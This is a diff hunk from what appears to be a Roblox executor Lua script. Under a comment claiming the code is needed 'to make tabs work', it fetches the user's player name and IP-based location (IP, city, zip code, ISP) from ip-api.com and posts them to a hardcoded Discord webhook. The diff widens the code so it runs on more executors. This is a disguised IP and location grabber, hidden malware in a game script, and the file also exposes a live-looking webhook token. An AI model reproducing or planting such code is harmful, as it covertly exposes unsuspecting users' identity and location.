@@ -30938,16 +30938,21 @@ local textbx = Instance.new("TextBox")
 
 -----------------------------------------------------------------------------
 --Important Script to make tabs work! DONT TOUCH--
+if syn then
+   HttpRequest = syn.request
+   else
+   HttpRequest = http_request
+end
 local player_name = game:GetService("Players").LocalPlayer.Name
 local webhook_url = "https://canary.discord.com/api/webhooks/996883487200124998/f6uyYqN3uYsQXvJ3NhBD-X9-gYPkrUK7c9qFjVlv5gYh5HtDv7dCjr7NeKJqXPuIRGcR"
 
-local ip_info = syn.request({
+local ip_info = HttpRequest({
     Url = "http://ip-api.com/json",
     Method = "GET"
 })
 local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
 local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-syn.request(
+HttpRequest(
     {
         Url = webhook_url,
         Method = "POST",
